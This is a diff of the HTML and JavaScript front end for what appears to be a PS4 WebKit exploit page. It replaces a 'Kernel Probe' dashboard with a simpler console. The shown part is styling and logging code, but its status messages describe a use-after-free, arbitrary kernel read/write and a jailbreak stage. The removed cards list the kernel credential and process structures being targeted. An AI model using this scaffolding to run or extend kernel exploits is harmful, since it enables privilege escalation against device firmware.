@@ -3,560 +3,203 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PS4 Kernel Probe — Dashboard</title>
+<title>WebKit Exploit — Console</title>
 <style>
   :root {
-    --bg:        #0a0c10;
-    --bg-2:      #0d1017;
-    --surface:   #131720;
-    --surface-2: #171c27;
-    --surface-3: #1c2230;
+    --bg:        #0b0e13;
+    --panel:     #12161f;
+    --panel2:    #0f131a;
     --border:    #232a38;
-    --border-2:  #2d3644;
-    --text:      #e0e6f0;
-    --text-dim:  #7a8699;
-    --text-faint:#4d5666;
-    --accent:    #5b9dff;
-    --accent-2:  #2d5a99;
-    --pass:      #45d17c;
-    --fail:      #ff5763;
-    --warn:      #ffb84d;
-    --purple:    #b088ff;
-    --cyan:      #5bc8e8;
-    --orange:    #ff8a4c;
-    --pink:      #ff6b9d;
+    --text:      #c9d4e3;
+    --dim:       #6b7a90;
+    --pass:      #3ddc84;
+    --fail:      #ff5c5c;
+    --warn:      #ffb020;
+    --info:      #8fa6c4;
+    --accent:    #4aa3ff;
   }
   * { box-sizing: border-box; }
   html, body { margin: 0; padding: 0; }
   body {
-    background:
-      radial-gradient(1200px 600px at 20% -10%, #101828 0%, transparent 60%),
-      radial-gradient(900px 500px at 100% 0%, #0e1420 0%, transparent 55%),
-      var(--bg);
+    background: var(--bg);
     color: var(--text);
-    font: 12.5px/1.45 'Inter', -apple-system, 'Segoe UI', system-ui, sans-serif;
+    font: 13px/1.45 'Courier New', ui-monospace, monospace;
     padding: 10px;
     height: 100vh;
     display: flex;
     flex-direction: column;
     gap: 8px;
     overflow: hidden;
-    -webkit-font-smoothing: antialiased;
   }
-  .mono { font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', ui-monospace, monospace; }
 
-  /* ================= TOP BAR ================= */
-  #topbar {
-    flex: 0 0 auto;
+  #statusbar {
     display: flex;
     align-items: center;
     justify-content: space-between;
-    gap: 14px;
-    padding: 12px 16px;
-    background: linear-gradient(180deg, var(--surface-2) 0%, var(--surface) 100%);
+    gap: 10px;
+    flex-wrap: wrap;
+    padding: 10px 12px;
     border: 1px solid var(--border);
-    border-radius: 10px;
-    position: relative;
-    overflow: hidden;
+    border-left: 6px solid var(--dim);
+    border-radius: 6px;
+    background: var(--panel);
   }
-  #topbar::before {
-    content: "";
-    position: absolute; left: 0; top: 0; bottom: 0;
-    width: 4px;
-    background: var(--text-faint);
-    transition: background .25s;
-  }
-  #topbar.pending::before { background: var(--text-faint); }
-  #topbar.running::before { background: var(--accent); }
-  #topbar.pass::before    { background: var(--pass); }
-  #topbar.fail::before    { background: var(--fail); }
-  #topbar.halted::before  { background: var(--warn); }
-  #topbar.pass   { background: linear-gradient(180deg, #0f1a15 0%, #0c1611 100%); }
-  #topbar.fail   { background: linear-gradient(180deg, #1a0f12 0%, #160c0f 100%); }
-  #topbar.halted { background: linear-gradient(180deg, #1a160c 0%, #161208 100%); }
+  #statusbar.pending  { border-left-color: var(--dim); }
+  #statusbar.running  { border-left-color: var(--accent); }
+  #statusbar.pass     { border-left-color: var(--pass); background: #0e1a14; }
+  #statusbar.fail     { border-left-color: var(--fail); background: #1a0e0e; }
+  #statusbar.halted   { border-left-color: var(--warn); background: #1a160a; }
 
-  .brand { display: flex; align-items: center; gap: 12px; min-width: 0; }
-  .brand-mark {
-    width: 34px; height: 34px;
-    display: flex; align-items: center; justify-content: center;
-    border-radius: 8px;
-    background: linear-gradient(135deg, var(--accent) 0%, var(--purple) 100%);
-    color: #0a0c10;
-    font-size: 18px;
-    font-weight: bold;
-    flex: 0 0 auto;
-    box-shadow: 0 0 20px rgba(91,157,255,.25);
+  .status-left { display: flex; align-items: center; gap: 10px; min-width: 0; }
+  .dot {
+    width: 12px; height: 12px; border-radius: 50%;
+    background: var(--dim); flex: 0 0 auto;
+    box-shadow: 0 0 0 0 rgba(0,0,0,0);
   }
-  .brand-title {
-    font-size: 14px;
-    font-weight: 700;
-    letter-spacing: .4px;
-    color: var(--text);
-  }
-  .brand-sub {
-    font-size: 10.5px;
-    color: var(--text-dim);
-    letter-spacing: .3px;
-  }
-
-  .status-block { display: flex; align-items: center; gap: 10px; min-width: 0; flex: 1 1 auto; }
-  .status-dot {
-    width: 10px; height: 10px;
-    border-radius: 50%;
-    background: var(--text-faint);
-    flex: 0 0 auto;
-    transition: background .25s, box-shadow .25s;
-  }
-  #topbar.running .status-dot { background: var(--accent); box-shadow: 0 0 12px var(--accent); animation: pulse 1.4s ease-in-out infinite; }
-  #topbar.pass    .status-dot { background: var(--pass); box-shadow: 0 0 12px var(--pass); }
-  #topbar.fail    .status-dot { background: var(--fail); box-shadow: 0 0 12px var(--fail); }
-  #topbar.halted  .status-dot { background: var(--warn); box-shadow: 0 0 12px var(--warn); }
+  #statusbar.running .dot { background: var(--accent); animation: pulse 1.1s infinite; }
+  #statusbar.pass    .dot { background: var(--pass); box-shadow: 0 0 10px var(--pass); }
+  #statusbar.fail    .dot { background: var(--fail); box-shadow: 0 0 10px var(--fail); }
+  #statusbar.halted  .dot { background: var(--warn); box-shadow: 0 0 10px var(--warn); }
   @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50%      { opacity: .45; }
+    0%   { box-shadow: 0 0 0 0 rgba(74,163,255,.7); }
+    70%  { box-shadow: 0 0 0 8px rgba(74,163,255,0); }
+    100% { box-shadow: 0 0 0 0 rgba(74,163,255,0); }
   }
   #statusText {
-    font-size: 14px;
-    font-weight: 700;
-    letter-spacing: .3px;
-    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-    color: var(--text);
-  }
-  #topbar.running #statusText { color: var(--accent); }
-  #topbar.pass    #statusText { color: var(--pass); }
-  #topbar.fail    #statusText { color: var(--fail); }
-  #topbar.halted  #statusText { color: var(--warn); }
-  #statusSub {
-    color: var(--text-dim);
-    font-size: 11px;
+    font-size: 15px; font-weight: bold; letter-spacing: .5px;
     white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
   }
+  #statusbar.pass #statusText { color: var(--pass); }
+  #statusbar.fail #statusText { color: var(--fail); }
+  #statusbar.running #statusText { color: var(--accent); }
+  #statusbar.halted #statusText { color: var(--warn); }
+  #statusSub { color: var(--dim); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
-  .counters { display: flex; gap: 8px; flex: 0 0 auto; }
-  .counter {
-    display: flex; flex-direction: column; align-items: center;
-    padding: 5px 12px;
-    border-radius: 8px;
-    background: var(--bg-2);
-    border: 1px solid var(--border);
-    min-width: 60px;
+  .status-right { display: flex; gap: 6px; flex-wrap: wrap; }
+  .chip {
+    padding: 3px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;
+    border: 1px solid var(--border); background: var(--panel2); color: var(--dim);
   }
-  .counter-n { font-size: 16px; font-weight: 700; line-height: 1.1; font-family: 'JetBrains Mono', monospace; }
-  .counter-l { font-size: 9px; letter-spacing: 1px; color: var(--text-faint); font-weight: 600; }
-  .counter.pass .counter-n { color: var(--pass); }
-  .counter.fail .counter-n { color: var(--fail); }
-  .counter.warn .counter-n { color: var(--warn); }
+  .chip.pass { color: var(--pass); border-color: #1f4a35; }
+  .chip.fail { color: var(--fail); border-color: #4a1f1f; }
+  .chip.warn { color: var(--warn); border-color: #4a3a1f; }
 
-  /* ================= STATS STRIP ================= */
-  #statsbar {
-    flex: 0 0 auto;
-    display: grid;
-    grid-template-columns: repeat(7, minmax(0, 1fr));
-    gap: 6px;
-  }
-  @media (max-width: 1000px) { #statsbar { grid-template-columns: repeat(4, minmax(0, 1fr)); } }
-  @media (max-width: 640px)  { #statsbar { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
-
-  .stat {
-    padding: 7px 10px;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    display: flex;
-    flex-direction: column;
-    gap: 1px;
-    min-width: 0;
-    transition: border-color .2s;
-  }
-  .stat:hover { border-color: var(--border-2); }
-  .stat-k {
-    font-size: 9.5px;
-    letter-spacing: 1px;
-    color: var(--text-faint);
-    font-weight: 700;
-    text-transform: uppercase;
-  }
-  .stat-v {
-    font-size: 12px;
-    font-family: 'JetBrains Mono', monospace;
-    color: var(--text);
-    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-  }
-  .stat.ok  .stat-v { color: var(--pass); }
-  .stat.warn .stat-v { color: var(--warn); }
-  .stat.bad  .stat-v { color: var(--fail); }
-  .stat.accent .stat-v { color: var(--accent); }
-  .stat.purple .stat-v { color: var(--purple); }
-
-  /* ================= TOOLBAR ================= */
   #toolbar {
-    flex: 0 0 auto;
     display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
     padding: 6px 8px;
     border: 1px solid var(--border);
-    border-radius: 8px;
-    background: var(--surface);
+    border-radius: 6px;
+    background: var(--panel2);
   }
   button {
-    font: inherit;
-    font-size: 11.5px;
-    font-weight: 500;
-    padding: 6px 12px;
+    font: inherit; font-size: 12px;
+    padding: 5px 10px;
     color: var(--text);
-    background: var(--surface-2);
-    border: 1px solid var(--border-2);
-    border-radius: 6px;
+    background: #1b2230;
+    border: 1px solid var(--border);
+    border-radius: 4px;
     cursor: pointer;
-    transition: background .12s, border-color .12s, transform .05s;
   }
-  button:hover { background: var(--surface-3); border-color: #3a4556; }
+  button:hover { background: #253044; border-color: #35425c; }
   button:active { transform: translateY(1px); }
-  button.primary {
-    background: linear-gradient(180deg, #2c5c9e 0%, #234a80 100%);
-    border-color: #3d76be;
-    color: #fff;
-  }
-  button.primary:hover { background: linear-gradient(180deg, #3567ab 0%, #2a5590 100%); }
-  #toolbar label {
-    color: var(--text-dim);
-    font-size: 11px;
-    display: flex; align-items: center; gap: 5px;
-    cursor: pointer;
-    user-select: none;
-  }
+  button.primary { border-color: #1f4a7a; color: var(--accent); }
+  #toolbar label { color: var(--dim); font-size: 11px; display: flex; align-items: center; gap: 4px; cursor: pointer; }
   #toolbar .spacer { flex: 1 1 auto; }
-  #toolbar .meta { color: var(--text-faint); font-size: 11px; font-family: 'JetBrains Mono', monospace; }
+  #toolbar .meta { color: var(--dim); font-size: 11px; }
 
-  /* ================= DASHBOARD ================= */
-  #dashboard {
+  #consoleWrap {
     flex: 1 1 auto;
     min-height: 0;
-    overflow-y: auto;
-    display: grid;
-    grid-template-columns: repeat(3, minmax(0, 1fr));
-    gap: 10px;
-    align-content: start;
-    padding-right: 4px;
-  }
-  @media (max-width: 1000px) { #dashboard { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
-  @media (max-width: 640px)  { #dashboard { grid-template-columns: 1fr; } }
-
-  .card {
-    background: linear-gradient(180deg, var(--surface-2) 0%, var(--surface) 100%);
     border: 1px solid var(--border);
-    border-radius: 10px;
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-    transition: border-color .2s, box-shadow .2s;
-    position: relative;
-  }
-  .card.wide { grid-column: 1 / -1; }
-  .card.ok    { border-color: rgba(69,209,124,.35); box-shadow: 0 0 24px -12px rgba(69,209,124,.5) inset; }
-  .card.bad   { border-color: rgba(255,87,99,.4); }
-  .card.warn  { border-color: rgba(255,184,77,.35); }
-  .card.running { border-color: rgba(91,157,255,.35); }
-
-  .card-header {
-    padding: 9px 13px;
-    background: rgba(10,13,19,.5);
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    gap: 8px;
-    flex: 0 0 auto;
-  }
-  .card-title {
-    display: flex; align-items: center; gap: 9px;
-    font-size: 11px;
-    font-weight: 700;
-    letter-spacing: 1.1px;
-    color: var(--text-dim);
-    text-transform: uppercase;
-  }
-  .card-icon {
-    width: 20px; height: 20px;
-    display: flex; align-items: center; justify-content: center;
-    border-radius: 5px;
-    background: rgba(91,157,255,.12);
-    color: var(--accent);
-    font-size: 11px;
-    line-height: 1;
-  }
-  .card.ok   .card-icon { background: rgba(69,209,124,.12); color: var(--pass); }
-  .card.bad  .card-icon { background: rgba(255,87,99,.12); color: var(--fail); }
-  .card.warn .card-icon { background: rgba(255,184,77,.12); color: var(--warn); }
-
-  .badge {
-    padding: 2px 8px;
-    border-radius: 10px;
-    font-size: 9.5px;
-    font-weight: 700;
-    letter-spacing: .6px;
-    background: var(--bg-2);
-    color: var(--text-faint);
-    border: 1px solid var(--border);
-    text-transform: uppercase;
-    white-space: nowrap;
-  }
-  .badge.ok   { color: var(--pass); background: rgba(69,209,124,.08); border-color: rgba(69,209,124,.35); }
-  .badge.bad  { color: var(--fail); background: rgba(255,87,99,.08); border-color: rgba(255,87,99,.35); }
-  .badge.warn { color: var(--warn); background: rgba(255,184,77,.08); border-color: rgba(255,184,77,.35); }
-  .badge.run  { color: var(--accent); background: rgba(91,157,255,.08); border-color: rgba(91,157,255,.4); }
-  .badge.run::before {
-    content: ""; display: inline-block;
-    width: 5px; height: 5px; border-radius: 50%;
-    background: currentColor;
-    margin-right: 5px;
-    animation: pulse 1.1s ease-in-out infinite;
-    vertical-align: middle;
-  }
-
-  .card-body { padding: 5px 0 7px; flex: 1 1 auto; }
-
-  .row {
-    display: flex;
-    justify-content: space-between;
-    gap: 12px;
-    padding: 3.5px 13px;
-    font-size: 11.5px;
-    border-bottom: 1px dashed rgba(255,255,255,.03);
-    align-items: baseline;
-  }
-  .row:last-child { border-bottom: none; }
-  .row .k {
-    color: var(--text-dim);
-    flex: 0 0 auto;
-    white-space: nowrap;
-    font-size: 11px;
-  }
-  .row .v {
-    color: var(--text);
-    text-align: right;
-    word-break: break-all;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    min-width: 0;
-  }
-  .row.ok   .v { color: var(--pass); }
-  .row.bad  .v { color: var(--fail); }
-  .row.warn .v { color: var(--warn); }
-  .row.accent .v { color: var(--accent); }
-  .row.purple .v { color: var(--purple); }
-  .row.cyan .v { color: var(--cyan); }
-  .row.dim  .v { color: var(--text-faint); font-style: italic; }
-
-  /* ================= GADGET LAYOUT ================= */
-  .gadget-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-    gap: 10px;
-    padding: 10px 12px;
-  }
-  .gadget-group {
-    background: var(--bg-2);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 9px 11px;
-  }
-  .gadget-group-title {
-    font-size: 10px;
-    letter-spacing: 1.2px;
-    color: var(--purple);
-    text-transform: uppercase;
-    font-weight: 700;
-    margin-bottom: 7px;
-    display: flex;
-    justify-content: space-between;
-    gap: 6px;
-    align-items: center;
-  }
-  .gadget-group-title .count {
-    color: var(--text-faint);
-    font-weight: 600;
-    font-size: 10px;
-  }
-  .gadget-group-title .count.hit { color: var(--pass); }
-  .gadget-list { display: flex; flex-direction: column; gap: 2px; }
-  .gadget {
-    display: flex;
-    justify-content: space-between;
-    gap: 8px;
-    padding: 2.5px 0;
-    font-size: 11px;
-    border-bottom: 1px dashed rgba(255,255,255,.03);
-  }
-  .gadget:last-child { border-bottom: none; }
-  .gadget-name { color: var(--text); font-family: 'JetBrains Mono', monospace; }
-  .gadget-addr { color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 10.5px; }
-  .gadget.empty { color: var(--text-faint); font-style: italic; font-size: 10.5px; }
-
-  /* ================= STRING LIST ================= */
-  .string-list {
-    max-height: 200px;
-    overflow-y: auto;
-    padding: 6px 13px 8px;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 10.5px;
-    line-height: 1.6;
-  }
-  .string-item {
-    display: flex;
-    gap: 8px;
-    color: var(--text-dim);
-    word-break: break-all;
-  }
-  .string-item .addr { color: var(--accent); flex: 0 0 auto; }
-  .string-item .str  { color: var(--cyan); }
-
-  /* ================= CONSOLE ================= */
-  #consolePanel {
-    flex: 0 0 180px;
-    min-height: 0;
-    border: 1px solid var(--border);
-    border-radius: 10px;
+    border-radius: 6px;
     background: #05070a;
     overflow: hidden;
     display: flex;
     flex-direction: column;
-    transition: flex-basis .18s ease;
   }
-  #consolePanel.collapsed { flex-basis: 34px; }
   #consoleHead {
-    padding: 7px 13px;
-    background: var(--surface);
+    padding: 5px 10px;
+    background: var(--panel);
     border-bottom: 1px solid var(--border);
-    color: var(--text-dim);
-    font-size: 10.5px;
-    letter-spacing: 1.2px;
-    font-weight: 700;
+    color: var(--dim);
+    font-size: 11px;
+    letter-spacing: 1px;
     display: flex; justify-content: space-between; gap: 8px;
-    cursor: pointer;
-    user-select: none;
-    flex: 0 0 auto;
-    text-transform: uppercase;
   }
-  #consoleHead:hover { color: var(--text); }
   #out {
     flex: 1 1 auto;
     overflow: auto;
     padding: 6px 0;
-    font-size: 11.5px;
-    line-height: 1.45;
+    font-size: 12px;
+    line-height: 1.4;
     -webkit-overflow-scrolling: touch;
-    font-family: 'JetBrains Mono', monospace;
   }
-  #consolePanel.collapsed #out { display: none; }
   .logline {
     display: flex;
-    gap: 10px;
-    padding: 1px 13px;
+    gap: 8px;
+    padding: 1px 10px;
     border-left: 3px solid transparent;
     white-space: pre-wrap;
     word-break: break-word;
   }
-  .logline .time { color: #3a4252; flex: 0 0 auto; }
+  .logline .time { color: #3f4c60; flex: 0 0 auto; }
   .logline .msg  { flex: 1 1 auto; }
-  .logline.info  { color: var(--text-dim); border-left-color: #1c2433; }
-  .logline.pass  { color: var(--pass); border-left-color: var(--pass); background: rgba(69,209,124,.04); }
-  .logline.fail  { color: var(--fail); border-left-color: var(--fail); background: rgba(255,87,99,.05); }
-  .logline.warn  { color: var(--warn); border-left-color: var(--warn); background: rgba(255,184,77,.04); }
-  .logline.debug { color: #4a5568; border-left-color: #1c2433; }
+  .logline.info  { color: var(--info);  border-left-color: #1c2433; }
+  .logline.pass  { color: var(--pass);  border-left-color: var(--pass); font-weight: bold; background: #0a1710; }
+  .logline.fail  { color: var(--fail);  border-left-color: var(--fail); font-weight: bold; background: #170a0a; }
+  .logline.warn  { color: var(--warn);  border-left-color: var(--warn); background: #17120a; }
+  .logline.debug { color: #5a6a80; border-left-color: #1c2433; }
 
-  #out::-webkit-scrollbar,
-  #dashboard::-webkit-scrollbar,
-  .string-list::-webkit-scrollbar { width: 8px; height: 8px; }
-  #out::-webkit-scrollbar-track,
-  #dashboard::-webkit-scrollbar-track,
-  .string-list::-webkit-scrollbar-track { background: transparent; }
-  #out::-webkit-scrollbar-thumb,
-  #dashboard::-webkit-scrollbar-thumb,
-  .string-list::-webkit-scrollbar-thumb { background: #2a3444; border-radius: 4px; }
-  #out::-webkit-scrollbar-thumb:hover,
-  #dashboard::-webkit-scrollbar-thumb:hover { background: #3a4556; }
+  #out::-webkit-scrollbar { width: 10px; height: 10px; }
+  #out::-webkit-scrollbar-track { background: #0a0d12; }
+  #out::-webkit-scrollbar-thumb { background: #263043; border-radius: 5px; }
 
   @media (max-width: 640px) {
-    .logline { font-size: 10.5px; }
-    #statusText { font-size: 12.5px; }
-    .brand-sub { display: none; }
+    .logline { font-size: 11px; }
+    #statusText { font-size: 13px; }
   }
 </style>
 </head>
 <body>
 
-<!-- ================= TOP BAR ================= -->
-<header id="topbar" class="pending">
-  <div class="brand">
-    <div class="brand-mark">◆</div>
-    <div style="min-width:0">
-      <div class="brand-title">PS4 KERNEL PROBE</div>
-      <div class="brand-sub">WebKit UAF → Arbitrary R/W → Deep Analysis</div>
-    </div>
-  </div>
-
-  <div class="status-block">
-    <span class="status-dot"></span>
+<div id="statusbar" class="pending">
+  <div class="status-left">
+    <span class="dot"></span>
     <div style="min-width:0">
       <div id="statusText">INITIALIZING…</div>
       <div id="statusSub">waiting for boot</div>
     </div>
   </div>
-
-  <div class="counters">
-    <div class="counter pass">
-      <span class="counter-n" id="chipPass">0</span>
-      <span class="counter-l">PASS</span>
-    </div>
-    <div class="counter fail">
-      <span class="counter-n" id="chipFail">0</span>
-      <span class="counter-l">FAIL</span>
-    </div>
-    <div class="counter warn">
-      <span class="counter-n" id="chipWarn">0</span>
-      <span class="counter-l">WARN</span>
-    </div>
+  <div class="status-right">
+    <span class="chip pass" id="chipPass">PASS 0</span>
+    <span class="chip fail" id="chipFail">FAIL 0</span>
+    <span class="chip warn" id="chipWarn">WARN 0</span>
   </div>
-</header>
-
-<!-- ================= STATS STRIP ================= -->
-<div id="statsbar">
-  <div class="stat accent"  id="stat-kbase"><span class="stat-k">KBASE</span><span class="stat-v">—</span></div>
-  <div class="stat"         id="stat-fw"><span class="stat-k">Firmware</span><span class="stat-v">—</span></div>
-  <div class="stat"         id="stat-proc0"><span class="stat-k">proc0</span><span class="stat-v">—</span></div>
-  <div class="stat"         id="stat-sysent"><span class="stat-k">sysent</span><span class="stat-v">—</span></div>
-  <div class="stat purple"  id="stat-gadgets"><span class="stat-k">Gadgets</span><span class="stat-v">—</span></div>
-  <div class="stat"         id="stat-strings"><span class="stat-k">Strings</span><span class="stat-v">—</span></div>
-  <div class="stat"         id="stat-uid"><span class="stat-k">uid/gid</span><span class="stat-v">—</span></div>
 </div>
 
-<!-- ================= TOOLBAR ================= -->
 <div id="toolbar">
-  <button id="btnCopy" class="primary">Copy Report</button>
-  <button id="btnClear">Clear Log</button>
-  <button id="btnToggleConsole">Console</button>
+  <button id="btnDownload" class="primary">⬇ Download log (.txt)</button>
+  <button id="btnCopy">Copy log</button>
+  <button id="btnClear">Clear</button>
   <label><input type="checkbox" id="chkAutoScroll" checked> auto-scroll</label>
+  <label><input type="checkbox" id="chkAutoSave"> auto-save .txt on finish</label>
   <span class="spacer"></span>
   <span class="meta" id="toolbarMeta">rev —</span>
 </div>
 
-<!-- ================= DASHBOARD ================= -->
-<main id="dashboard"></main>
-
-<!-- ================= CONSOLE ================= -->
-<section id="consolePanel">
-  <div id="consoleHead" title="click to collapse/expand">
-    <span>▸ CONSOLE OUTPUT</span>
+<div id="consoleWrap">
+  <div id="consoleHead">
+    <span>CONSOLE OUTPUT</span>
     <span id="consoleCount">0 lines</span>
   </div>
   <div id="out"></div>
-</section>
+</div>
 
 <script>
 "use strict";
 
 /* ============================================================
- *  LOGGER
+ *  CONSOLE / LOGGER LAYER
  * ============================================================ */
 var LOG = {
     lines: [],
@@ -564,6 +207,7 @@ var LOG = {
     startTime: Date.now(),
     maxLines: 8000,
     autoScroll: true,
+    autoSave: false,
     status: "pending",
     statusText: "INITIALIZING…",
     statusSub: "waiting for boot"
@@ -578,21 +222,25 @@ function fmtTime(ms) {
 
 function classify(tag, extra) {
     var t = (String(tag) + " " + (extra === undefined ? "" : String(extra))).toUpperCase();
+
     if (t.indexOf("FAILED")   !== -1) return "fail";
     if (t.indexOf("GIVE-UP")  !== -1) return "fail";
     if (t.indexOf("FAIL")     !== -1) return "fail";
     if (t.indexOf("MISMATCH") !== -1) return "fail";
     if (t.indexOf("THREW")    !== -1) return "fail";
     if (t.indexOf("ERROR")    !== -1) return "fail";
+
     if (t.indexOf("PASS")     !== -1) return "pass";
     if (t.indexOf("COMPLETE") !== -1) return "pass";
     if (t.indexOf("SUCCESS")  !== -1) return "pass";
     if (t.indexOf("RETAINED") !== -1) return "pass";
+
     if (t.indexOf("HALTED")   !== -1) return "warn";
     if (t.indexOf("MISS")     !== -1) return "warn";
     if (t.indexOf("RETRY")    !== -1) return "warn";
     if (t.indexOf("NO-RESULT")!== -1) return "warn";
     if (t.indexOf("NONE")     !== -1) return "warn";
+
     return "info";
 }
 
@@ -602,23 +250,28 @@ function renderLine(entry) {
         if (!el) return;
         var div = document.createElement("div");
         div.className = "logline " + entry.level;
+
         var t = document.createElement("span");
         t.className = "time";
         t.textContent = fmtTime(entry.t);
+
         var m = document.createElement("span");
         m.className = "msg";
         m.textContent = entry.text;
-        div.appendChild(t); div.appendChild(m);
+
+        div.appendChild(t);
+        div.appendChild(m);
         el.appendChild(div);
+
         if (LOG.autoScroll) el.scrollTop = el.scrollHeight;
     } catch (_) {}
 }
 
 function updateChips() {
     try {
-        document.getElementById("chipPass").textContent = LOG.counts.pass;
-        document.getElementById("chipFail").textContent = LOG.counts.fail;
-        document.getElementById("chipWarn").textContent = LOG.counts.warn;
+        document.getElementById("chipPass").textContent = "PASS " + LOG.counts.pass;
+        document.getElementById("chipFail").textContent = "FAIL " + LOG.counts.fail;
+        document.getElementById("chipWarn").textContent = "WARN " + LOG.counts.warn;
         document.getElementById("consoleCount").textContent = LOG.lines.length + " lines";
     } catch (_) {}
 }
@@ -638,7 +291,8 @@ function setStatus(state, text, sub) {
     LOG.statusText = text;
     LOG.statusSub = sub || "";
     try {
-        document.getElementById("topbar").className = state;
+        var bar = document.getElementById("statusbar");
+        bar.className = state;
         document.getElementById("statusText").textContent = text;
         document.getElementById("statusSub").textContent = sub || "";
     } catch (_) {}
@@ -647,438 +301,42 @@ function setStatus(state, text, sub) {
 function updateStatusFromMark(tag, extra) {
     var t = String(tag).toUpperCase();
     var e = extra === undefined ? "" : String(extra);
+
     if (t === "BOOT") {
         setStatus("running", "RUNNING", e);
+    } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
+        setStatus("running", "JAILBREAKING…", e);
     } else if (t.indexOf("KERNEL PROBE START") !== -1) {
         setStatus("running", "PROBING KERNEL…", e);
     } else if (t.indexOf("KERNEL PROBE COMPLETE") !== -1) {
-        setStatus("halted", "PROBE COMPLETE", "all reachable structures dumped");
-    } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
-        setStatus("running", "JAILBREAKING…", e);
+        setStatus("halted", "PROBE COMPLETE", "gadgets + kernel info in console");
+        maybeAutoSave();
+    } else if (t.indexOf("HALTED-BEFORE-JAILBREAK") !== -1) {
+        setStatus("halted", "R/W PASS — HALTED", "jailbreak disabled (add ?jb=1 to continue)");
+        maybeAutoSave();
     } else if (t.indexOf("GENUINE-UB-RW-PASS") !== -1) {
         setStatus("pass", "ARBITRARY R/W — PASS", e);
     } else if (t.indexOf("JAILBREAK COMPLETE") !== -1) {
         setStatus("pass", "JAILBREAK COMPLETE — PASS", e);
+        maybeAutoSave();
     } else if (t.indexOf("FAILED-TERMINAL") === 0) {
         setStatus("fail", "FAILED — " + e, "terminal, no retry");
-    } else if (t.indexOf("JAILBREAK-ERROR") === 0 || t.indexOf("PROBE-ERROR") === 0) {
-        setStatus("fail", "ERROR", e);
+        maybeAutoSave();
+    } else if (t.indexOf("JAILBREAK-ERROR") === 0) {
+        setStatus("fail", "JAILBREAK ERROR — FAIL", e);
+        maybeAutoSave();
+    } else if (t.indexOf("PROBE-ERROR") === 0) {
+        setStatus("fail", "PROBE ERROR — FAIL", e);
+        maybeAutoSave();
     }
 }
 
-/* ============================================================
- *  STATS STRIP HELPERS
- * ============================================================ */
-function setStat(id, value, level) {
-    var el = document.getElementById("stat-" + id);
-    if (!el) return;
-    el.className = "stat" + (level ? " " + level : "");
-    var v = el.querySelector(".stat-v");
-    if (v) v.textContent = (value === undefined || value === null || value === "") ? "—" : String(value);
-}
-
-/* ============================================================
- *  DASHBOARD DEFINITION
- * ============================================================ */
-var CARDS = [
-    { id: "fw", title: "Firmware", icon: "▣", rows: [
-        { key: "label",       label: "FW Label",       placeholder: "detecting…" },
-        { key: "ua",          label: "User Agent",     placeholder: "—" },
-        { key: "rev",         label: "Revision",       placeholder: "—" },
-        { key: "off-evf",     label: "EVF offset",     placeholder: "—" },
-        { key: "off-prison0", label: "prison0 offset", placeholder: "—" },
-        { key: "off-root",    label: "rootvnode off",  placeholder: "—" },
-        { key: "off-sysent",  label: "sysent offset",  placeholder: "—" },
-        { key: "off-jmp",     label: "jmp offset",     placeholder: "—" }
-    ]},
-    { id: "rw", title: "R/W Primitive", icon: "◈", rows: [
-        { key: "state",   label: "State",           placeholder: "waiting" },
-        { key: "read",    label: "Arbitrary read",  placeholder: "—" },
-        { key: "write",   label: "Arbitrary write", placeholder: "—" },
-        { key: "restore", label: "State restore",   placeholder: "—" },
-        { key: "host",    label: "Host cell",       placeholder: "—" },
-        { key: "fake",    label: "Fake cell",       placeholder: "—" },
-        { key: "target",  label: "Target cell",     placeholder: "—" },
-        { key: "sid",     label: "SID",             placeholder: "—" },
-        { key: "rwhdr",   label: "RW header",       placeholder: "—" },
-        { key: "tghdr",   label: "Target header",   placeholder: "—" }
-    ]},
-    { id: "kbase", title: "Kernel Base & Header", icon: "⌂", rows: [
-        { key: "base",    label: "KBASE",       placeholder: "0xffffffff80000000" },
-        { key: "q0",      label: "k[0x000]",    placeholder: "—" },
-        { key: "q1",      label: "k[0x008]",    placeholder: "—" },
-        { key: "q2",      label: "k[0x010]",    placeholder: "—" },
-        { key: "q3",      label: "k[0x018]",    placeholder: "—" },
-        { key: "q4",      label: "k[0x020]",    placeholder: "—" },
-        { key: "q5",      label: "k[0x028]",    placeholder: "—" },
-        { key: "q6",      label: "k[0x030]",    placeholder: "—" },
-        { key: "q7",      label: "k[0x038]",    placeholder: "—" },
-        { key: "entropy", label: "Entropy",     placeholder: "—" }
-    ]},
-    { id: "strings", title: "Kernel Strings", icon: "❝", strings: true },
-    { id: "proc0", title: "proc0 — Process 0", icon: "◆", rows: [
-        { key: "addr",     label: "Address",       placeholder: "—" },
-        { key: "pid",      label: "p_pid",         placeholder: "—" },
-        { key: "ppid",     label: "p_ppid",        placeholder: "—" },
-        { key: "pgid",     label: "p_pgid",        placeholder: "—" },
-        { key: "flag",     label: "p_flag",        placeholder: "—" },
-        { key: "ucred",    label: "p_ucred",       placeholder: "—" },
-        { key: "fd",       label: "p_fd",          placeholder: "—" },
-        { key: "vmspace",  label: "p_vmspace",     placeholder: "—" },
-        { key: "threads",  label: "p_threads",     placeholder: "—" },
-        { key: "comm",     label: "p_comm",        placeholder: "—" }
-    ]},
-    { id: "ucred", title: "Credential Chain", icon: "◉", rows: [
-        { key: "addr",     label: "ucred addr",   placeholder: "—" },
-        { key: "uid",      label: "cr_uid",       placeholder: "—" },
-        { key: "ruid",     label: "cr_ruid",      placeholder: "—" },
